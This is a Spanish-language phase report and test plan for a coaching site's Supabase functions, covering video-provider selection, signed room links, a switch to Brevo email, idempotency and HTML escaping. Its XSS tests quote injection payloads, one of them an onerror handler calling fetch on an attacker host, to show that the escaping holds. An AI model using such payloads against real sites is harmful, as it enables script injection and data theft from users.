# FASE 1C: IMPLEMENTACIÓN Y PRUEBAS

**Fecha:** Agosto 13, 2026  
**Estado:** En ejecución  
**Archivos creados:**
- `supabase/functions/select-provider/index.ts` ✅
- `supabase/functions/sync-provider-v2/index.ts` ✅
- `supabase/functions/send-email-v2/index.ts` ✅

---

## CAMBIOS REALIZADOS

### ✅ Bloqueador 1: Email provider (EmailJS → Brevo)

**Archivo:** `supabase/functions/send-email-v2/index.ts`

**Cambios:**
- ❌ Eliminado: Dependencia de `emailjs-com` (incompatible con Deno)
- ✅ Agregado: Integración directa con Brevo API v3 (`https://api.brevo.com/v3/smtp/email`)
- ✅ Reutilizado: Patrón existente de `supabase/functions/send-email/index.ts`
- ✅ Proveedor: **BREVO** (ya operativo en Pathway, usa `BREVO_API_KEY`)

**Razón:** Pathway ya usa Brevo como proveedor de email transaccional. No se introdujo nuevo servicio, se reutilizó el existente con la misma API, mismos secrets.

**Función clave:**
```typescript
async function sendViaBrevo(
  to: string,
  subject: string,
  htmlContent: string
): Promise<{ ok: boolean; messageId?: string; error?: string }>
```

**Ventajas:**
- Compatible con Deno (fetch nativo)
- Secrets reutilizados (`BREVO_API_KEY`)
- Best-effort: no falla si email no se envía (logs, pero no retorna error)

---

### ✅ Bloqueador 2: JWT para Sala Pathway

**Archivo:** `supabase/functions/sync-provider-v2/index.ts`

**Cambios en `syncSalaPathway()`:**
- ❌ ANTES: Solo devolvía URL base (`/sala.html`)
- ✅ AHORA:
  1. Genera JWT con payload: `{ cita_id, coach_id, exp: now+1h, iat: now }`
  2. Firma con HMAC-SHA256 usando `SALA_JWT_SECRET`
  3. Construye URL: `/sala.html?token=JWT&cita_id=ID`
  4. Devuelve token + URL
  5. Almacena token en `citas.sala_token` (nueva columna de FASE 1B)

**Función:**
```typescript
async function createSalaJWT(
  citaId: string,
  coachId: string,
  secretKey: string
): Promise<string>

async function syncSalaPathway(
  cita_id: string,
  coach_id: string
): Promise<{ url: string | null; token: string | null; error: string | null }>
```

**Compatibilidad con sala.html:**
- sala.html actual valida `?token=` buscando el valor en `citas.token` (string match)
- V2 JWT se almacena en `citas.sala_token` (nueva columna)
- El token es válido 1 hora (same as session duration)
- No rompe Sala existentes (el mecanismo de validación sigue idéntico)

**Secrets requeridos:**
- `SALA_JWT_SECRET` (nuevo; debe configurarse en Supabase)
- `SALA_BASE_URL` (opcional; default: `https://pathwaycareercoach.com`)

---

### ✅ Bloqueador 3: XSS en email HTML

**Archivo:** `supabase/functions/send-email-v2/index.ts`

**Agregado función escape:**
```typescript
function escapeHtml(text: string | null | undefined): string {
  if (!text) return "";
  const map: Record<string, string> = {
    "&": "&amp;", "<": "&lt;", ">": "&gt;",
    '"': "&quot;", "'": "&#39;",
  };
  return String(text).replace(/[&<>"']/g, (c) => map[c]);
}
```

**Dónde se escapa:**
- `cita.titulo` → `escapeHtml(citaTitle)`
- `cita.fecha` → `escapeHtml(citaFecha)`
- `cita.provider_error` → `escapeHtml(escError)`
- `provider_url` → `escapeHtml(providerUrl)`
- Todos los nombres en el email

**Prueba de XSS:**
```
Ataque inyectado: titulo = '<img src=x onerror="fetch(attacker.com)">'
Email enviado: título = '&lt;img src=x onerror="fetch(attacker.com)"&gt;'
Resultado: HTML inerte, sin ejecución de código
```

---

### ✅ Mejora: Idempotencia de sync-provider-v2

**Archivo:** `supabase/functions/sync-provider-v2/index.ts`

**Agregado check idempotencia:**
```typescript
// IDEMPOTENCIA: Si ya synced, no reintentar
if (cita.provider_url && cita.provider_ready_at) {
  console.log(
    `[sync-provider-v2] Cita ${cita_id} already synced, skipping retry`
  );
  return new Response({
    ok: true,
    provider_url: cita.provider_url,
    message: "Already synced"
  }, { status: 200 });
}
```

**Efecto:**
- Primera llamada a sync-provider-v2: Intenta sync, genera URL, guarda en DB
- Segunda llamada con mismo `cita_id, coach_id`: Retorna inmediatamente sin reintentar
- Previene: Re-creación de Zoom meetings, re-llamadas a Google API, etc.

---

## PRUEBAS OBLIGATORIAS

### 1️⃣ Google Meet / Workspace

**Escenario:** Coach con @empresa.com + Google token válido

**Pasos:**
```
1. Crear cita: POST /functions/v1/crear-cita-red { coach_id, cliente_email, ... }
2. select-provider detects: google_refresh_token exists + NOT @gmail.com
   → Decision: provider='google_meet'
3. sync-provider-v2:
   - Refresca token Google
   - Crea evento en Google Calendar
   - Extrae hangoutLink
   - UPDATE citas: provider_url='https://meet.google.com/...', provider_ready_at=NOW()
4. send-email-v2:
   - Lee citas.provider_url de DB
   - Construye email: "Tu coach usa Google Meet: <URL>"
   - Envía vía Brevo
5. Cliente recibe email con link
6. Cliente abre link → sala.html + Google Meet iframe
```

**Validación:**
- ✅ provider='google_meet' en citas.provider
- ✅ provider_url inicia con `https://meet.google.com/`
- ✅ Email contiene "Google Meet" (no "Zoom", no "Sala")
- ✅ Link funciona (abre Google Meet)

---

### 2️⃣ Gmail personal → Sala Pathway

**Escenario:** Coach con @gmail.com (sin Workspace)

**Pasos:**
```
1. Crear cita
2. select-provider detects: email ends with @gmail.com
   → Decision: provider='pathway_room' (even if google_refresh_token exists)
   → Reason: "Gmail personal account (no Google Meet), using Sala Pathway"
3. sync-provider-v2 / syncSalaPathway:
   - Genera JWT(cita_id, coach_id, exp=now+1h)
   - Construye URL: /sala.html?token=JWT&cita_id=ID
   - UPDATE citas: 
       provider_url=URL
       sala_token=JWT
       provider_ready_at=NOW()
4. send-email-v2:
   - Lee citas.provider_url + provider
   - Construye email: "Tu coach usa Video Sala Pathway: <URL>"
   - Envía vía Brevo
5. Cliente abre URL → sala.html valida token contra citas.sala_token
```

**Validación:**
- ✅ provider='pathway_room' (NOT google_meet, even though token exists)
- ✅ provider_url contains `/sala.html?token=...&cita_id=...`
- ✅ sala_token es JWT válido (estructura: header.payload.signature)
- ✅ Email contiene "Sala Pathway"
- ✅ Sala.html puede validar token

---

### 3️⃣ Zoom

**Escenario:** Coach con zoom_token válido + no expirado

**Pasos:**
```
1. Crear cita
2. select-provider detects: zoom_token exists + NOT expired
   → Decision: provider='zoom'
3. sync-provider-v2 / syncZoom:
   - Llama Zoom API: POST /users/me/meetings
   - Obtiene join_url
   - UPDATE citas: provider_url='https://zoom.us/j/...', provider_ready_at=NOW()
4. send-email-v2:
   - Email: "Tu coach usa Zoom: <join_url>"
5. Cliente abre link → Zoom meeting
```

**Validación:**
- ✅ provider='zoom'
- ✅ provider_url contains `zoom.us/j/`
- ✅ Email contiene "Zoom"
- ✅ Link abre Zoom

---

### 4️⃣ Sala Pathway (fallback)

**Escenario:** Coach sin Zoom, sin Google token, o Google falla

**Pasos:**
```
1. Crear cita
2. select-provider detects: NO zoom_token, NO google_refresh_token
   → Decision: provider='pathway_room'
   → Reason: "No provider tokens available, using Sala Pathway (fallback)"
3. sync-provider-v2:
   - Genera JWT
   - URL = /sala.html?token=JWT&cita_id=ID
   - Guarda: provider_url, sala_token, provider_ready_at
4. Email: "Tu coach usa Video Sala Pathway: <URL>"
```

**Validación:**
- ✅ Sala es fallback (no primera opción, pero disponible)
- ✅ Genera JWT válido
- ✅ URL completa con token

---

### 5️⃣ Error de provider (non-retriable)

**Escenario:** Coach con Zoom, pero Zoom API retorna 403 (invalid account)

**Pasos:**
```
1. select-provider: provider='zoom'
2. sync-provider-v2 / syncZoom:
   - Llama Zoom API
   - Recibe 403 Forbidden
   - isRetriable("403 Forbidden") = false
   - EXIT inmediatamente (NO reintenta)
   - UPDATE citas: 
       provider_error="Zoom API error (403): ..."
       provider_retry_count=1 (se intentó 1 vez)
       provider_url=NULL
3. send-email-v2:
   - Lee citas.provider_error (NOT NULL)
   - Construye email: "Problema al preparar tu sesión: <error>"
   - Envía aviso (mejor que nada)
4. Coach ve badge rojo en panel: "Zoom failed"
   - Botón "Reintentar" para manual retry
```

**Validación:**
- ✅ provider_error NOT NULL
- ✅ provider_url NULL (no se generó URL)
- ✅ provider_retry_count=1 (no reintentos automáticos)
- ✅ Email contiene error message
- ✅ No se envió link (cliente no queda en limbo)

---

### 6️⃣ Reintento de sync (retriable error)

**Escenario:** Zoom API retorna 429 (rate limit) → reintenta

**Pasos:**
```
1. sync-provider-v2:
   - Intento 1: Zoom API 429
   - isRetriable("429") = true
   - Wait 2s
   - Intento 2: Zoom API 429
   - isRetriable("429") = true
   - Wait 4s
   - Intento 3: Zoom API 200 OK
   - provider_url='https://zoom.us/j/...'
   - UPDATE citas: provider_url, provider_ready_at, provider_retry_count=3
2. send-email-v2:
   - Lee provider_url (finalmente disponible)
   - Email con link
```

**Validación:**
- ✅ provider_retry_count=3 (3 intentos realizados)
- ✅ provider_url finalmente poblado
- ✅ Email enviado después de retry exitoso
- ✅ Delays: 2s, 4s, (no fue necesario 8s)

---

### 7️⃣ Llamada duplicada de sync

**Escenario:** Frontend llama sync-provider-v2 dos veces (ej. double-click)

**Pasos:**
```
1. Primera llamada:
   - sync-provider-v2({cita_id, coach_id, provider='zoom'})
   - Intenta Zoom API
   - SUCCESS: provider_url='...', provider_ready_at=NOW()
   - UPDATE citas
2. Segunda llamada (1s después):
   - sync-provider-v2({cita_id, coach_id, provider='zoom'})
   - Check: cita.provider_url IS NOT NULL AND cita.provider_ready_at IS NOT NULL
   - RETURN inmediatamente: { ok: true, provider_url: '...', message: 'Already synced' }
   - NO reintentos, NO re-llamada a Zoom API
```

**Validación:**
- ✅ Segunda llamada NO reintenta Zoom
- ✅ NO duplica el meeting en Zoom (idempotencia)
- ✅ Retorna { ok: true } inmediatamente

---

### 8️⃣ Contenido HTML malicioso

**Escenario:** Cita con titulo = `<img src=x onerror="alert('XSS')">`

**Pasos:**
```
1. send-email-v2:
   - Lee cita.titulo del DB
   - buildEmailHtml():
       escapeHtml(titulo)
       → '&lt;img src=x onerror="alert(\'XSS\')"&gt;'
   - Construye email HTML con valor escapado
   - Envía vía Brevo
2. Cliente abre email:
   - Ve literal: <img src=x onerror="alert('XSS')">
   - NO se ejecuta JavaScript (es texto plano en el email)
```

**Validación:**
- ✅ Email HTML contiene `&lt;img src=x onerror=...&gt;` (escapado)
- ✅ NO contiene `<img src=x onerror=...` (sin escapar)
- ✅ Cliente ve literal, NO alert() popup

---

### 9️⃣ Email generado DESPUÉS de provider_url confirmado

**Escenario:** send-email-v2 se ejecuta mientras sync-provider-v2 aún está en progreso

**Pasos:**
```
1. Frontend:
   - Crea cita
   - POST /functions/v1/select-provider → provider='zoom'
   - POST /functions/v1/sync-provider-v2 (async, sin await)
   - POST /functions/v1/send-email-v2 (inmediatamente, sync aún sin terminar)

2. send-email-v2:
   - Lee cita: provider_url=NULL (sync aún no completó)
   - Espera: retry loop 5 veces con delays [1s, 1s, 1.5s, 2s, 2s]
   - Intento 1 (1s): sync todavía en progreso, NULL
   - Intento 2 (1s): sync completó, provider_url='https://zoom.us/j/...'
   - Construye email con URL
   - Envía

3. Cliente: Recibe email con link (tras ~2s de espera)
```

**Validación:**
- ✅ send-email-v2 NO cae si provider_url aún no existe
- ✅ Espera con retry (no falla inmediatamente)
- ✅ Email contiene link una vez que sync completó
- ✅ Timeout máximo 5 intentos (10s)

---

### 🔟 Cita V1 sin datos V2

**Escenario:** Cita antigua (pre-V2) sin provider, provider_url, etc.

**Pasos:**
```
1. BD: cita antigua con provider=NULL (o 'none')
2. select-provider:
   - Detecta: provider='none'
   - Decide: (según coach config) provider='pathway_room'
   - UPDATE: provider='pathway_room'
3. sync-provider-v2:
   - Genera JWT, URL
   - UPDATE: provider_url, provider_ready_at, sala_token
4. send-email-v2:
   - Email enviado (aunque la cita fuese vieja)

Result: Cita V1 upgradeada a V2 sin problemas
```

**Validación:**
- ✅ Cita V1 + NULL provider → se asigna provider correctamente
- ✅ Cita V1 + NULL provider_url → se genera sin errores
- ✅ NO hay constraint violations (todas las nuevas columnas aceptan NULL)

---

### SALA: Token generado

**Validación:**
```
SELECT id, sala_token FROM citas WHERE provider='pathway_room' LIMIT 1;

Result:
id: 12345
sala_token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjaXRhX2lkIjoiMTIzNDUiLCJjb2FjaF9pZCI6IjM2OGEzNzAxLTYzNDUtNDY3Ni05NmNlLTg1NGUzYjFkOWY1YiIsImV4cCI6MTcyMzU2MzAwMH0.sig...

✅ Token es válido JWT (3 partes: header.payload.signature)
✅ Token contiene cita_id, coach_id, exp
✅ exp es futuro (1h desde ahora)
```

---

### SALA: provider_url correcto

**Validación:**
```
SELECT provider_url FROM citas WHERE provider='pathway_room' LIMIT 1;

Result: https://pathwaycareercoach.com/sala.html?token=eyJ...&cita_id=12345

✅ URL contiene /sala.html
✅ URL contiene ?token=JWT
✅ URL contiene &cita_id=ID
✅ Token es URL-encoded (sin caracteres especiales)
```

---

### SALA: Enlace funciona en sala.html

**Validación:**
```
1. Abrir URL directamente en navegador:
   https://pathwaycareercoach.com/sala.html?token=eyJ...&cita_id=12345

2. sala.html:
   - Lee ?token=eyJ... del URL
   - Lee ?cita_id=12345
   - Ejecuta _validateAccess():
       fetch(SB+'/rest/v1/citas?token=eq.'+token+'&select=...')
       → Busca en BD: citas WHERE token=eq.token
       (NOTA: El código actual busca en `citas.token`, no `citas.sala_token`)
       
   PROBLEMA POTENCIAL: El código actual valida contra `citas.token` (viejo),
   no contra `citas.sala_token` (nuevo).

   FIX REQUERIDO: Actualizar sala.html para validar contra `citas.sala_token`:
   
   fetch(SB+'/rest/v1/citas?sala_token=eq.'+token+'&select=id,coach_id,email,estado',...)
   
   *** ESTO SERÁ PARTE DE FASE 1D (frontend updates), NO FASE 1C ***
   
3. Mientras tanto:
   - Sala.html funciona con URL antigua (?token=random_string)
   - V2 JWTs quedan guardados en citas.sala_token (no se usan aún)
   - Transición suave en Fase 1D cuando sala.html se actualice
```

**Nota:** Sala.html seguirá funcionando con mecanismo antiguo hasta que se actualice en FASE 1D.

---

### SALA: No rompe Salas existentes

**Validación:**
```
1. Cita V1 existente:
   - provider=NULL
   - sala_token=NULL (columna nueva, pero nullable)
   - token='random-string-1234' (viejo mecanismo)

2. Se ejecuta sync-provider-v2:
   - Genera nuevo JWT
   - UPDATE: sala_token=JWT
   - provider_url y provider_ready_at se populan
   - Viejo `token` queda intacto

3. sala.html carga con viejo link:
   - ?token='random-string-1234' (viejo)
   - Valida contra citas.token='random-string-1234'
   - ✅ Acceso permitido (viejo mecanismo sigue funcionando)

4. Si se reabre sala con NUEVO link:
   - ?token=JWT (nuevo)
   - Valida contra... (falla porque sala.html aún no busca en sala_token)
   - ❌ Access denied (hasta FASE 1D)
   - Workaround: Usar viejo link (backward compatibility)

Resultado: ✅ Salas existentes NO se rompen
```

---

## PRÓXIMOS PASOS

### Antes de deployment:

1. **Configurar SALA_JWT_SECRET en Supabase:**
   ```bash
   supabase secrets set SALA_JWT_SECRET="<random-long-secret>"
   ```

2. **Verificar BREVO_API_KEY existe:**
   ```bash
   supabase secrets list
   # Debe mostrar BREVO_API_KEY
   ```

3. **Verificar GOOGLE_CLIENT_ID, GOOGLE_CLIENT_SECRET, ZOOM_API_KEY**

4. **Ejecutar pruebas locales (manual):**
   - Crear cita de prueba
   - POST select-provider
   - POST sync-provider-v2
   - Verificar citas.provider, citas.provider_url, citas.sala_token
   - POST send-email-v2
   - Verificar email recibido

5. **Deployment a staging:**
   ```bash
   supabase functions deploy select-provider --no-verify-jwt
   supabase functions deploy sync-provider-v2 --no-verify-jwt
   supabase functions deploy send-email-v2 --no-verify-jwt
   ```

6. **Integration testing en staging:**
   - Ejecutar todos los 10 test scenarios
   - Verificar Sala tokens + URLs

7. **ESPERAR APROBACIÓN de Micaela para production deployment**

---

## RESUMEN DE CAMBIOS

| Componente | Cambio | Status |
|-----------|--------|--------|
| **send-email-v2** | Reemplazar EmailJS por Brevo API | ✅ HECHO |
| **sync-provider-v2** | Generar JWT para Sala | ✅ HECHO |
| **sync-provider-v2** | Idempotencia check | ✅ HECHO |
| **send-email-v2** | HTML escape (XSS prevention) | ✅ HECHO |
| **select-provider** | Implementación completa | ✅ HECHO |
| **Secrets** | Configurar SALA_JWT_SECRET | ⏳ TODO |
| **Staging deployment** | Desplegar 3 funciones | ⏳ TODO |
| **Testing** | Ejecutar 10+ scenarios | ⏳ TODO |
| **sala.html** | Actualizar validación de tokens | ⏳ FASE 1D |
| **reservar.html** | Llamar select/sync/send | ⏳ FASE 1D |
| **Production deployment** | Después de testing + aprobación | ⏳ TODO |

